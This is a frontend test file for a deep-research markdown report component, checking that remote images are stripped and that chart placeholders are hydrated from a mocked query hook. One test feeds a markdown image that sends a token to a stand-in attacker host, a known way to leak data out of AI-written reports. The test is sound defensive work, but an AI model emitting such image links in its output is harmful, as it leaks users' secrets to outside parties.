import { type AiDeepResearchChartData } from '@lightdash/common';
import { screen } from '@testing-library/react';
import { renderWithProviders } from '../../../../../testing/testUtils';
import { DeepResearchMarkdownReport } from './DeepResearchMarkdownReport';

const mocks = vi.hoisted(() => ({ useChartQuery: vi.fn() }));

vi.mock('../../hooks/useDeepResearch', () => ({
    useDeepResearchChartQuery: mocks.useChartQuery,
}));

vi.mock('./DeepResearchChartTile', () => ({
    DeepResearchChartTile: ({ chart }: { chart: AiDeepResearchChartData }) => (
        <div>{chart.title}</div>
    ),
}));

const queryUuid = '7c4b40ba-79f8-4fd2-9c43-223eca8fa76f';

describe('DeepResearchMarkdownReport', () => {
    it('does not render remote images from report markdown', async () => {
        renderWithProviders(
            <DeepResearchMarkdownReport
                markdown={
                    '![secret](https://attacker.example/collect?token=secret)'
                }
                projectUuid="project-1"
                runUuid="run-1"
            />,
        );

        expect(screen.queryByRole('img')).not.toBeInTheDocument();
        expect(document.body.innerHTML).not.toContain('attacker.example');
    });

    it('hydrates a live query-backed chart', async () => {
        mocks.useChartQuery.mockReturnValue({
            isLoading: false,
            data: { title: 'Revenue trend' },
        });

        renderWithProviders(
            <DeepResearchMarkdownReport
                markdown={`## Finding\n\n<chart id="${queryUuid}" title="Revenue trend" description="Revenue by month.">`}
                projectUuid="project-1"
                runUuid="run-1"
            />,
        );

        expect(await screen.findByText('Revenue trend')).toBeVisible();
        expect(mocks.useChartQuery).toHaveBeenCalledWith({
            projectUuid: 'project-1',
            runUuid: 'run-1',
            queryUuid,
        });
    });
});
